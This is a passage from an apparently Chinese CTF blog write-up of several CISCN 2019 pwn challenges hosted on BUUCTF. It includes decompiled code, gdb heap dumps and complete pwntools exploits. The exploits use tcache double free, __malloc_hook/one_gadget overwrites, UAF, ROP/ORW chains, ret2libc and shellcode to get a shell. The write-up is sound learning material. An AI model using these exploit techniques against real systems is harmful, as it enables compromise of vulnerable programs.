0x0, bk_nextsize = 0x0&#125;0x563281ce92e0 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 33, fd = 0x563281ce9250, bk = 0x9250, fd_nextsize = 0x0, bk_nextsize = 0x20d01&#125; 其实是通过mchunk来实现合并，相关链接堆漏洞挖掘:08—chunk的mchunk_prev_size成员的空间复用 123456789101112131415161718192021#codefor i in range(0, 7): remove(1) add(2, 0x20) remove(1)#gdb0x55fcf5564250 PREV_INUSE &#123; mchunk_prev_size = 145, mchunk_size = 145, fd = 0x7f00598fcca0 &lt;main_arena+96&gt;, bk = 0x7f00598fcca0 &lt;main_arena+96&gt;, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;pwndbg&gt; bintcachebins0x20 [ -1]: 00x90 [ 7]: 0x55fcf5564260 —▸ 0x7f00598fcca0 (main_arena+96) —▸ 0x55fcf55643e0 ◂— 0x0.........................unsortedbinall: 0x55fcf5564250 —▸ 0x7f00598fcca0 (main_arena+96) ◂— 0x55fcf5564250 不断申请和释放，由于tcache最多只能存储7个chunk，所以之前的全部被分配进了unsorted bin，实现了chunk的合并，之后偶就是常规的找地址了 4.EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *context.log_level = &quot;debug&quot;p = process(&quot;./ciscn_final_2&quot;)elf = ELF(&#x27;./ciscn_final_2&#x27;)libc = ELF(&#x27;/home/joe1sn/libc/64/libc-2.27.so&#x27;)def add(add_type, add_num): p.sendlineafter(&#x27;which command?\\n&gt; &#x27;, &#x27;1&#x27;) p.sendlineafter(&#x27;TYPE:\\n1: int\\n2: short int\\n&gt;&#x27;, str(add_type)) p.sendafter(&#x27;your inode number:&#x27;, str(add_num))def remove(remove_type): p.sendlineafter(&#x27;which command?\\n&gt; &#x27;, &#x27;2&#x27;) p.sendlineafter(&#x27;TYPE:\\n1: int\\n2: short int\\n&gt;&#x27;, str(remove_type))def show(show_type): p.sendlineafter(&#x27;which command?\\n&gt; &#x27;, &#x27;3&#x27;) p.sendlineafter(&#x27;TYPE:\\n1: int\\n2: short int\\n&gt;&#x27;, str(show_type)) if show_type == 1: p.recvuntil(&#x27;your int type inode number :&#x27;) elif show_type == 2: p.recvuntil(&#x27;your short type inode number :&#x27;) return int(p.recvuntil(&#x27;\\n&#x27;, drop=True))if __name__ == &#x27;__main__&#x27;: add(1,0x30) remove(1) add(2,0x20) add(2,0x20) add(2,0x20) add(2,0x20) remove(2) add(1,0x30) remove(2) addr_chunk0_prev_size = show(2) - 0xa0 add(2, addr_chunk0_prev_size) add(2, addr_chunk0_prev_size) add(2, 0x91) for i in range(0, 7): remove(1) add(2, 0x20) remove(1) addr_main_arena = show(1) - 96 libcbase = addr_main_arena - libc.sym[&#x27;__malloc_hook&#x27;] - 0x10 addr__IO_2_1_stdin__fileno = libcbase + libc.sym[&#x27;_IO_2_1_stdin_&#x27;] + 0x70 log.success(&quot;libc base &gt; %x&quot;,libcbase) log.success(&quot;addr IO 2 1 stdin fileno &gt; %x&quot;,addr__IO_2_1_stdin__fileno) gdb.attach(p) add(1, addr__IO_2_1_stdin__fileno) add(1, 0x30) remove(1) add(2, 0x20) remove(1) addr_chunk0_fd = show(1) - 0x30 add(1, addr_chunk0_fd) add(1, addr_chunk0_fd) add(1, 111) add(1, 666) p.sendlineafter(&#x27;which command?\\n&gt; &#x27;, &#x27;4&#x27;) p.recvuntil(&#x27;your message :&#x27;) p.interactive() EXP来源 PwnKi-ciscn_2019_final_2 ciscn_2019_final_3 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled 2.IDA 只有add和remove 1234567891011def add(idx,size,data): p.sendlineafter(&quot;choice &gt; &quot;,&#x27;1&#x27;) p.sendlineafter(&quot;the index&quot;,str(idx)) p.sendlineafter(&quot;the size&quot;,str(size)) p.sendlineafter(&quot;something&quot;,data) p.recvuntil(&#x27;gift :&#x27;) return int(p.recvline()[2:],16)def free(idx): p.sendlineafter(&quot;choice &gt; &quot;,&#x27;2&#x27;) p.sendlineafter(&quot;the index&quot;,str(idx)) add 12345678910111213v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;input the size&quot;); std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::istream::operator&gt;&gt;(&amp;std::cin, &amp;size); if ( (unsigned int)size &lt;= 0x78 ) &#123; v2 = HIDWORD(size); qword_2022A0[v2] = malloc((unsigned int)size); v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;now you can write something&quot;); std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); READ(qword_2022A0[HIDWORD(size)], size); puts(&quot;OK!&quot;); printf(&quot;gift :%p\\n&quot;, qword_2022A0[HIDWORD(size)]); &#125; 对申请的堆的大小进行了判断，并且可以给我们挡墙申请堆块的地址 remove 123if ( v2 &gt; 0x18 ) exit(0); free(qword_2022A0[v2]); 指针没有清零，所以我们可以多次释放来形成unsorted bin； 然后释放unsorted bin，来泄露libc base和malloc hook； 最后通过malloc hook+one gadget来getshehll 3.GDB 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#codeheap=add(0,0x78,&#x27;a&#x27;)#0print(hex(heap))add(1,0x18,&#x27;b&#x27;)#1add(2,0x78,&#x27;c&#x27;)#2add(3,0x78,&#x27;d&#x27;)#3 add(4,0x78,&#x27;c&#x27;)#4add(5,0x78,&#x27;d&#x27;)#5 add(6,0x78,&#x27;c&#x27;)#6add(7,0x78,&#x27;d&#x27;)#7 add(8,0x78,&#x27;c&#x27;)#8add(9,0x78,&#x27;d&#x27;)#9 add(10,0x78,&#x27;c&#x27;)#10add(11,0x78,&#x27;d&#x27;)#11add(12,0x28,&#x27;d&#x27;)#12#dup (double free)free(12)free(12)gdb.attach(p)#输出&gt; 0x557389971e70#GDB0x557389971e60 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 129, fd = 0xa61, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x557389971ee0 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 33, fd = 0xa62, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x81&#125;0x557389971f00 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 129, fd = 0xa63, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;................................................0x557389972400 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 49, fd = 0x557389972410, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;pwndbg&gt; x/16gx 0x5573899724000x557389972400: 0x0000000000000000 0x00000000000000310x557389972410: 0x0000557389972410 0x00000000000000000x557389972420: 0x0000000000000000 0x00000000000000000x557389972430: 0x0000000000000000 0x000000000000ebd10x557389972440: 0x0000000000000000 0x00000000000000000x557389972450: 0x0000000000000000 0x00000000000000000x557389972460: 0x0000000000000000 0x00000000000000000x557389972470: 0x0000000000000000 0x0000000000000000 12345678910111213141516#codeadd(13,0x28,p64(heap-0x10))#4 add(14,0x28,p64(heap-0x10))#5add(15,0x28,p64(0)+p64(0x421))#get chunk0-&gt;sizegdb.attach(p)&gt;&gt;&gt;之前的输出为0x561fb56f5e60#GDB0x561fb56f5e60 PREV_INUSE &#123; mchunk_prev_size = 0, mchunk_size = 1057, fd = 0xa0a, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;&gt;&gt;&gt;这里的size位已经被修改成了0x421为后面做准备 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#codefree(0) #unsort_bin chunk0-&gt;fd=libcfree(1) #tcacheadd(16,0x78,&#x27;e&#x27;)#7 add(17,0x18,&#x27;f&#x27;)#8 get chunk1gdb.attach(p)&gt;&gt;&gt;输出 0x55584522be60#GDB0x55584522be60 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 129, fd = 0x7fbd07fc0a65, bk = 0x7fbd07fca090 &lt;main_arena+1104&gt;, fd_nextsize = 0x55584522be60, bk_nextsize = 0x55584522be60&#125;0x55584522bee0 PREV_INUSE &#123; mchunk_prev_size = 0, mchunk_size = 929, fd = 0x7fbd07fc0a66, bk = 0x7fbd07fc9ca0 &lt;main_arena+96&gt;, fd_nextsize = 0x0, bk_nextsize = 0x81&#125;pwndbg&gt; bintcachebins0x20 [ 0]: 0x7fbd07fc9ca0 (main_arena+96) ◂— ...0x30 [ -1]: 0unsortedbinall [corrupted]FD: 0x55584522bee0 ◂— 0x7fbd07fc0a66BK: 0x55584522bee0 —▸ 0x7fbd07fc9ca0 (main_arena+96) ◂— 0x55584522bee0pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA................... 0x55584521a000 0x55584523b000 rw-p 21000 0 [heap] ..................................0x7fbd07bde000 0x7fbd07dc5000 r-xp 1e7000 0 /lib/x86_64-linux-gnu/libc-2.27.so&gt;&gt;&gt;这里已经被修改为了unsorted bin，再次申请堆的话就是申请[0x562fe6debee0 PREV_INUSE]这块的bk，而且返回的地址是&gt; bk = 0x7f22f4cccca0 &lt;main_arena+96&gt;#开始计算libc base&gt;&gt;&gt; hex(0x7fbd07fc9ca0-0x7fbd07bde000)&#x27;0x3ebca0&#x27;[DEBUG] Received 0x33 bytes: &#x27;OK!\\n&#x27; &#x27;gift :0x7fbd07fc9ca0\\n&#x27; &#x27;1. add\\n&#x27; &#x27;2. remove\\n&#x27; &#x27;choice &gt; &#x27;(&#x27;0x7fbd07bde000&#x27;, &#x27;0x7fbd07fc9c30&#x27;) 4.EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768from pwn import *#context.log_level = &quot;debug&quot;#p = process(&quot;./ciscn_final_3&quot;)p = remote(&quot;node3.buuoj.cn&quot;,27672)libc=ELF(&#x27;./libc.so.6&#x27;)def add(idx,size,data): p.sendlineafter(&quot;choice &gt; &quot;,&#x27;1&#x27;) p.sendlineafter(&quot;the index&quot;,str(idx)) p.sendlineafter(&quot;the size&quot;,str(size)) p.sendlineafter(&quot;something&quot;,data) p.recvuntil(&#x27;gift :&#x27;) return int(p.recvline()[2:],16)def free(idx): p.sendlineafter(&quot;choice &gt; &quot;,&#x27;2&#x27;) p.sendlineafter(&quot;the index&quot;,str(idx)) heap=add(0,0x78,&#x27;a&#x27;)#0log.info(&quot;chunks 0&gt; 0x%x&quot;,heap)add(1,0x18,&#x27;b&#x27;)#1add(2,0x78,&#x27;c&#x27;)#2add(3,0x78,&#x27;d&#x27;)#3 add(4,0x78,&#x27;c&#x27;)#4add(5,0x78,&#x27;d&#x27;)#5 add(6,0x78,&#x27;c&#x27;)#6add(7,0x78,&#x27;d&#x27;)#7 add(8,0x78,&#x27;c&#x27;)#8add(9,0x78,&#x27;d&#x27;)#9 add(10,0x78,&#x27;c&#x27;)#10add(11,0x78,&#x27;d&#x27;)#11add(12,0x28,&#x27;d&#x27;)#12#dup (double free)free(12)free(12)#gdb.attach(p)add(13,0x28,p64(heap-0x10))#4 add(14,0x28,p64(heap-0x10))#5add(15,0x28,p64(0)+p64(0x421))#get chunk0-&gt;size#gdb.attach(p)#overlapfree(0) #unsort_bin chunk0-&gt;fd=libcfree(1) #tcacheadd(16,0x78,&#x27;e&#x27;)#7 add(17,0x18,&#x27;f&#x27;)#8 get chunk1#gdb.attach(p)leak=add(18,0x18,&#x27;g&#x27;)#9 get libclibc_base =leak - 0x3ebca0malloc_hook=libc_base+libc.sym[&#x27;__malloc_hook&#x27;]one_gadget=libc_base+0x10a38clog.info(&quot;libc base 0x%x&quot;,libc_base)log.info(&quot;malloc hook 0x%x&quot;,malloc_hook)log.info(&quot;one gadget 0x%x&quot;,one_gadget)#dupfree(5)free(5)add(19,0x78,p64(malloc_hook))add(20,0x78,p64(malloc_hook))add(21,0x78,p64(one_gadget))#getshellp.sendline(&#x27;1&#x27;)p.sendline(&#x27;22&#x27;)p.sendline(&#x27;0;cat flag&#x27;)p.interactive() ciscn_2019_final_4 https://blog.csdn.net/seaaseesa/article/details/105855306 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA sandbox 1234567 line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000000 A = sys_number 0001: 0x35 0x02 0x00 0x40000000 if (A &gt;= 0x40000000) goto 0004 0002: 0x15 0x01 0x00 0x0000003b if (A == execve) goto 0004 0003: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0004: 0x06 0x00 0x00 0x00000000 return KILL delete 123456789101112131415unsigned __int64 delete()&#123; int idx; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;please don&#x27;t patch this function!! I will check it!!&quot;); puts(&quot;index ?&quot;); _isoc99_scanf(&quot;%d&quot;, &amp;idx); if ( idx &gt;= 0 &amp;&amp; idx &lt;= 31 &amp;&amp; note[idx] ) free(note[idx]); else puts(&quot;invalid index&quot;); return __readfsqword(0x28u) ^ v2;&#125; uaf造成double free 程序只能orw，存在uaf，chunk-&gt;size大小随意，show可以泄露 3.思路 在写name的时候伪造一个chunk头 然后用uaf 泄露libcbase和environ 利用environ找到name(fake_chunk)，使用double free分配过去 泄露canary，扩大rsp 写orw的ropchain 4.EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138#coding:utf8from pwn import * sh = remote(&#x27;node3.buuoj.cn&#x27;,25021)#sh = process(&#x27;./ciscn_final_4&#x27;)#sh = process(&#x27;./test&#x27;)libc = ELF(&#x27;libc-2.23.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]environ_s = libc.symbols[&#x27;__environ&#x27;] fake_chunk = p64(0) + p64(0x81)payload = &#x27;a&#x27;*0xE8 + fake_chunk sh.sendafter(&#x27;what is your name?&#x27;,payload) def add(size,content): sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;) sh.sendlineafter(&#x27;size?&#x27;,str(size)) sh.sendafter(&#x27;content?&#x27;,content) def delete(index): sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;) sh.sendlineafter(&#x27;index ?&#x27;,str(index)) def show(index): sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;) sh.sendlineafter(&#x27;index ?&#x27;,str(index)) #0add(0x100,&#x27;a&#x27;*0x100)#1add(0x78,&#x27;b&#x27;*0x78)#2add(0x78,&#x27;c&#x27;*0x78)#3add(0x38,&#x27;d&#x27;*0x38)#4add(0x38,&#x27;e&#x27;*0x38)#5add(0x10,&#x27;d&#x27;*0x10)#6add(0x81,&#x27;f&#x27;*0x81)#heap_size数组的0x81数据用于伪造chunk的sizeheapsize6_addr = 0x0000000000602058note_addr = 0x00000000006020C0 delete(0)show(0)sh.recvuntil(&#x27;\\n&#x27;)main_arena_88 = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_senviron_addr = libc_base + environ_spop_rdi = libc_base + 0x0000000000021102pop_rsi = libc_base + 0x00000000000202e8pop_rdx = libc_base + 0x0000000000001b92#add rsp, 0x148 ; retadd_rsp_148 = libc_base + 0x00000000000353aaopenat_addr = libc_base + libc.sym[&#x27;openat&#x27;]read_addr = libc_base + libc.sym[&#x27;read&#x27;]puts_addr = libc_base + libc.sym[&#x27;puts&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;environ_addr=&#x27;,hex(environ_addr)#double freedelete(1)delete(2)delete(1)add(0x78,p64(heapsize6_addr - 0x8)) #7add(0x78,&#x27;c&#x27;) #8add(0x78,&#x27;a&#x27;) #9#控制notesize以及note数组payload = &#x27;\\x00&#x27;*0x60payload += p64(environ_addr) #ptr0add(0x78,payload) #10#泄露栈地址show(0)sh.recvuntil(&#x27;\\n&#x27;)stack_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))print &#x27;stack_addr=&#x27;,hex(stack_addr)fake_chunk_stack_addr = stack_addr - 0x120print &#x27;fake_chunk_stack_addr=&#x27;,hex(fake_chunk_stack_addr)#利用同样的方法分配到栈上伪造的chunk#double freedelete(1)delete(2)delete(1)add(0x78,p64(fake_chunk_stack_addr)) #11add(0x78,&#x27;c&#x27;) #12add(0x78,&#x27;a&#x27;) #13#写栈add(0x78,&#x27;d&#x27;*0x11) #14#泄露canaryshow(14)sh.recvuntil(&#x27;d&#x27;*0x11)canary = u64(sh.recv(7).rjust(8,&#x27;\\x00&#x27;))print &#x27;canary=&#x27;,hex(canary)#重新分配到fake_chunk_stack_addr，布置rop#double freedelete(1)delete(2)delete(1)add(0x78,p64(fake_chunk_stack_addr)) #15add(0x78,&#x27;c&#x27;) #16add(0x78,&#x27;a&#x27;) #17#由于长度不够输入，我们调用read继续输入ropnext_rop_addr = fake_chunk_stack_addr + 0x88payload = &#x27;a&#x27;*0x40payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(next_rop_addr) + p64(pop_rdx) + p64(0x1000) + p64(read_addr)add(0x78,payload) #18 #由于无法触发main函数rop，因为有一个死循环，所以我们劫持new函数来rop到main后面#接下来，分配到new函数的栈末尾处fake_chunk_stack_addr2 = stack_addr - 0x246#double freedelete(3)delete(4)delete(3)add(0x38,p64(fake_chunk_stack_addr2)) #15add(0x38,&#x27;c&#x27;) #16add(0x38,&#x27;a&#x27;) #17 payload = &#x27;d&#x27;*0x6 + p64(canary) + p64(0)payload += p64(add_rsp_148) #跳到main函数后面的rop里#new函数返回到add_rsp_148进而跳到main后面的rop里add(0x38,payload) flag_addr = next_rop_addr + 0x88#openat(0,flag_addr,0)rop = p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdi) + p64(0) + p64(openat_addr)#read(fd,flag_addr,0x30)rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30) + p64(read_addr)#puts(flag_addr)rop += p64(pop_rdi) + p64(flag_addr) + p64(puts_addr)rop += &#x27;/flag\\x00&#x27;sleep(0.5)sh.send(rop) sh.interactive() ciscn_2019_n_1 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 12345678910111213141516171819202122232425262728293031323334353637383940// local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+Ch] [rbp-4h] init(*(_QWORD *)&amp;argc, argv, envp); puts(&quot;EEEEEEE hh iii &quot;); puts(&quot;EE mm mm mmmm aa aa cccc hh nn nnn eee &quot;); puts(&quot;EEEEE mmm mm mm aa aaa cc hhhhhh iii nnn nn ee e &quot;); puts(&quot;EE mmm mm mm aa aaa cc hh hh iii nn nn eeeee &quot;); puts(&quot;EEEEEEE mmm mm mm aaa aa ccccc hh hh iii nn nn eeeee &quot;); puts(&quot;====================================================================&quot;); puts(&quot;Welcome to this Encryption machine\\n&quot;); begin(&quot;Welcome to this Encryption machine\\n&quot;); while ( 1 ) &#123; while ( 1 ) &#123; fflush(0LL); v4 = 0; __isoc99_scanf(&quot;%d&quot;, &amp;v4); getchar(); if ( v4 != 2 ) break; puts(&quot;I think you can do it by yourself&quot;); begin(&quot;I think you can do it by yourself&quot;); &#125; if ( v4 == 3 ) &#123; puts(&quot;Bye!&quot;); return 0; &#125; if ( v4 != 1 ) break; encrypt(); begin(&quot;%d&quot;); &#125; puts(&quot;Something Wrong!&quot;); return 0;&#125; encrypt 123456789101112131415161718192021222324252627282930313233343536int encrypt()&#123; size_t v0; // rbx char s[48]; // [rsp+0h] [rbp-50h] __int16 v3; // [rsp+30h] [rbp-20h] memset(s, 0, sizeof(s)); v3 = 0; puts(&quot;Input your Plaintext to be encrypted&quot;); gets(s); while ( 1 ) &#123; v0 = (unsigned int)x; if ( v0 &gt;= strlen(s) ) break; if ( s[x] &lt;= 96 || s[x] &gt; 122 ) &#123; if ( s[x] &lt;= 64 || s[x] &gt; 90 ) &#123; if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 ) s[x] ^= 0xFu; &#125; else &#123; s[x] ^= 0xEu; &#125; &#125; else &#123; s[x] ^= 0xDu; &#125; ++x; &#125; puts(&quot;Ciphertext&quot;); return puts(s);&#125; 没有binsh字符串，没有system函数,应该是一个puts函数泄露libc的题 BUUCTF的resource一栏有libc.so文件 3.EXP 12345678910111213141516171819202122232425262728293031323334353637from pwn import *#context.log_level = &#x27;debug&#x27;p = remote(&quot;node3.buuoj.cn&quot;,25460)elf = ELF(&quot;./ciscn_2019_c_1&quot;)libc = ELF(&quot;./libc-2.27.so&quot;)puts_plt = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]main_addr = elf.sym[&quot;main&quot;]libc_puts = libc.sym[&quot;puts&quot;]system = libc.sym[&quot;system&quot;]binsh = next(libc.search(&#x27;/bin/sh&#x27;))pop_rdi = 0x0400c83leave_ret = 0x04006b9payload = &#x27;A&#x27;*(0x50+8) + p64(pop_rdi)+ p64(puts_got) + p64(puts_plt) + p64(main_addr)p.recvuntil(&quot;Input your choice!\\n&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;Input your Plaintext to be encrypted\\n&quot;)p.sendline(payload)p.recvuntil(&#x27;@\\n&#x27;)puts_real = u64(p.recv(6).ljust(8,&quot;\\x00&quot;))libc_base = puts_real - libc_putssystem_real = system + libc_basebinsh_real = binsh + libc_basepayload = &#x27;\\x00&#x27;*(0x50+8) + p64(leave_ret) + p64(pop_rdi) + p64(binsh_real) + p64(system_real)p.recvuntil(&quot;Input your choice!\\n&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;Input your Plaintext to be encrypted\\n&quot;)p.sendline(payload)p.interactive() 还有一个坑就是Ubuntu18下面调用system要对齐栈，就需要用一个ret 参照EXP:[https://www.jianshu.com/p/f6839b1e7283]( ciscn_2019_n_3 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA 发现程序有三个功能 1234puts(&quot;1. New note&quot;);puts(&quot;2. Del note&quot;);puts(&quot;3. Show note&quot;);puts(&quot;4. Purchase Pro Edition&quot;) //这个没用 rec_str_free 123456int __cdecl rec_str_free(void *ptr)&#123; free(*((void **)ptr + 2)); free(ptr); return puts(&quot;Note freed!&quot;);&#125; free后指针未清零 3.GDB动态调试 12345678910111213141516171819//code: newnote(0,2,&#x27;a&#x27;*10,0x88)//gdb0x8cf7000 FASTBIN &#123; prev_size = 0, size = 17, fd = 0x80486de &lt;rec_str_print&gt;, bk = 0x8048725 &lt;rec_str_free&gt;, fd_nextsize = 0x8cf7018, bk_nextsize = 0x91&#125;0x8cf7010 PREV_INUSE &#123; prev_size = 147812376, size = 145, fd = 0x61616161, bk = 0x61616161, fd_nextsize = 0xa6161, bk_nextsize = 0x0&#125; 发现申请的堆里面含有rec_str_free的指针 我们可以利用UAF来修改指针，从而getshell 4.EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *context.log_level = &#x27;debug&#x27;elf = ELF(&quot;ciscn_2019_n_3&quot;)p = process(&quot;./ciscn_2019_n_3&quot;)#p = remote(rmt,port)def newnote(idx,type,value,length=0): p.recvuntil(&quot;CNote &gt; &quot;) p.sendline(str(1)) p.recvuntil(&quot;Index &gt; &quot;) p.sendline(str(idx)) p.recvuntil(&quot;Type &gt; &quot;) p.sendline(str(type)) if type == 1: p.recvuntil(&quot;Value &gt; &quot;) p.sendline(str(value)) else: p.recvuntil(&quot;Length &gt; &quot;) p.sendline(str(length)) p.recvuntil(&quot;Value &gt; &quot;) if length == 8: p.send(value) else: p.sendline(value)def delnote(idx): p.recvuntil(&quot;CNote &gt; &quot;) p.sendline(str(2)) p.recvuntil(&quot;Index &gt; &quot;) p.sendline(str(idx))def shownote(idx): p.recvuntil(&quot;CNote &gt; &quot;) p.sendline(str(3)) p.recvuntil(&quot;Index &gt; &quot;) p.sendline(str(idx))if __name__ == &quot;__main__&quot;: newnote(0,2,&#x27;a&#x27;*10,0x88) newnote(1,2,&#x27;a&#x27;*10,0x38) gdb.attach(p) newnote(2,1,0x41) #newnote(2,2,&#x27;b&#x27;*10,0x38) delnote(1) delnote(2) newnote(3,2,&#x27;aaaa&#x27;+p32(elf.plt[&#x27;system&#x27;]),0xc) #gdb.attach(p) newnote(4,2,&quot;/bin/sh\\x00&quot;,0x38) delnote(1) p.interactive() ciscn_2019_n_5 1.checksec 123456Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x400000)RWX: Has RWX segments 2.IDA main 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+0h] [rbp-20h] setvbuf(stdout, 0LL, 2, 0LL); puts(&quot;tell me your name&quot;); read(0, &amp;name, 0x64uLL); puts(&quot;wow~ nice name!&quot;); puts(&quot;What do you want to say to me?&quot;); gets(&amp;v4, &amp;name); return 0;&#125; name 123456789.bss:0000000000601080 public name.bss:0000000000601080 name db ? ; ; DATA XREF: main+35↑o.bss:0000000000601081 db ? ;.bss:0000000000601082 db ? ;.bss:0000000000601083 db ? ;.bss:0000000000601084 db ? ;.bss:0000000000601085 db ? ;.bss:0000000000601086 db ? ;.bss:0000000000601087 db ? ; 既然没有保护，应该是shellcode，所以不要往复杂的方向想 shellcode + 溢出 + 栈转移 3.EXP 123456789101112131415from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,26651)elf = ELF(&quot;./ciscn_2019_n_5&quot;)context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)name_addr = 0x0601080shellcode = asm(shellcraft.sh())p.recvuntil(&#x27;tell me your name\\n&#x27;)p.sendline(shellcode)payload = &#x27;a&#x27;*(0x20+8)+p64(name_addr)p.recvuntil(&#x27;me?&#x27;)p.sendline(payload)p.interactive() context的类型一定要写 ciscn_2019_n_8 1.checksec() 123456[*] &#x27;/root/download/BUUCTF/ciscn_2019_n_8/ciscn_2019_n_8&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 全保护，我尿了 2.IDA main 12345678910111213141516171819202122232425262728293031323334353637383940int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp-14h] [ebp-20h] int v5; // [esp-10h] [ebp-1Ch] var[13] = 0; var[14] = 0; init(); puts(&quot;What&#x27;s your name?&quot;); __isoc99_scanf(&quot;%s&quot;, var, v4, v5); // ====+STACK_OVERFLOW+==== if ( *(_QWORD *)&amp;var[13] ) &#123; if ( *(_QWORD *)&amp;var[13] == 17LL ) system(&quot;/bin/sh&quot;); else printf( &quot;something wrong! val is %d&quot;, var[0], var[1], var[2], var[3], var[4], var[5], var[6], var[7], var[8], var[9], var[10], var[11], var[12], var[13], var[14]); &#125; else &#123; printf(&quot;%s, Welcome!\\n&quot;, var); puts(&quot;Try do something~&quot;); &#125; return 0;&#125; 第一个输入让var[13]为17可以进入,不管用啥方式，覆盖52个位置就可以传递17这个数字了，超级简单 3.EXP 1234567from pwn import *#context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,26629)#p = process(&quot;./ciscn_2019_n_8&quot;)payload = &quot;a&quot;*52 + p32(17)p.sendlineafter(&quot;?&quot;,payload)p.interactive() ciscn_2019_ne_5 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // [esp+0h] [ebp-100h] char src[4]; // [esp+4h] [ebp-FCh] char v5; // [esp+8h] [ebp-F8h] char s1[4]; // [esp+84h] [ebp-7Ch] char v7; // [esp+88h] [ebp-78h] int *v8; // [esp+F4h] [ebp-Ch] v8 = &amp;argc; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); fflush(stdout); *(_DWORD *)s1 = 48; memset(&amp;v7, 0, 0x60u); *(_DWORD *)src = 0x30; memset(&amp;v5, 0, 0x7Cu); puts(&quot;Welcome to use LFS.&quot;); printf(&quot;Please input admin password:&quot;); __isoc99_scanf((int)&quot;%100s&quot;, (int)s1); if ( strcmp(s1, &quot;administrator&quot;) ) &#123; puts(&quot;Password Error!&quot;); exit(0); &#125; puts(&quot;Welcome!&quot;); while ( 1 ) &#123; puts(&quot;Input your operation:&quot;); puts(&quot;1.Add a log.&quot;); puts(&quot;2.Display all logs.&quot;); puts(&quot;3.Print all logs.&quot;); printf(&quot;0.Exit\\n:&quot;); __isoc99_scanf((int)&quot;%d&quot;, (int)&amp;v3); switch ( v3 ) &#123; case 0: exit(0); return; case 1: AddLog((int)src); break; case 2: Display(src); break; case 3: Print(); break; case 4: GetFlag(src); break; default: continue; &#125; &#125;&#125; GetFlag 12345678910int __cdecl GetFlag(char *src)&#123; char dest[4]; // [esp+0h] [ebp-48h] char v3; // [esp+4h] [ebp-44h] *(_DWORD *)dest = 0x30; memset(&amp;v3, 0, 0x3Cu); strcpy(dest, src); return printf(&quot;The flag is your log:%s\\n&quot;, dest);&#125; 